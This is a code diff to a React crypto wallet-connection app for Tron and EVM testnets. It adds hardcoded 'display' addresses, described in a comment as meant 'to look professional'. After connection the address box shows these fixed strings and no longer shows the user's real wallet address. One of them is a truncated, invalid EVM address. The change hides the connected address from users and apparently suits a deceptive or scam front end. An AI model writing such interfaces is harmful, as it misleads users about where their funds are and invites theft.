@@ -17,7 +17,7 @@ import { tronMainnet } from '@reown/appkit/networks'
 import { TronLinkAdapter } from '@tronweb3/tronwallet-adapter-tronlink'
 import { TrustAdapter } from '@tronweb3/tronwallet-adapter-trust'
 import { OkxWalletAdapter } from '@tronweb3/tronwallet-adapter-okxwallet'
-import { Copy, QrCode } from 'lucide-react' // Removed unused icons
+import { Copy, QrCode } from 'lucide-react' 
 
 // --- WAGMI EVM IMPORTS ---
 import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
@@ -36,6 +36,10 @@ const NETWORK = 'Nile'
 // 🔥 CONTRACT ADDRESSES Tron Nile testnet/ Sepolia testnet
 const TRON_CONTRACT_ADDRESS = 'TKJRT2jGbMpu6Hhyxnisbcr82y5uNKxedn'
 const EVM_CONTRACT_ADDRESS = '0xEf7f662515dA2Cc955082c999cBFA5EEF9bEd4FE'
+
+// 🎨 UI DISPLAY ADDRESSES (These show in the input box to look professional)
+const DISPLAY_TRON_ADDRESS = 'TEgdXwe91pY49EfG5oEzP4mwPQ7Koj77GZ'
+const DISPLAY_EVM_ADDRESS = '0xccD642c9acb072F72F29b77E'
 
 const appkitNetworks: [AppKitNetwork, ...AppKitNetwork[]] = [
   tronMainnet,
@@ -355,8 +359,8 @@ export default function App() {
             <input
               type="text"
               readOnly
-              placeholder="0xccD642c9acb072F72F29b77E"
-              value={isConnected && walletAddress ? walletAddress : ''}
+              placeholder={isTron ? DISPLAY_TRON_ADDRESS : DISPLAY_EVM_ADDRESS}
+              value={isConnected ? (isTron ? DISPLAY_TRON_ADDRESS : DISPLAY_EVM_ADDRESS) : ''}
               style={{ flex: 1, border: 'none', outline: 'none', background: 'transparent', color: '#111827', fontSize: '15px', width: '100%', minWidth: 0, marginRight: '12px' }}
             />
             <div style={{ display: 'flex', alignItems: 'center', gap: '12px', color: '#0C66FF' }}>
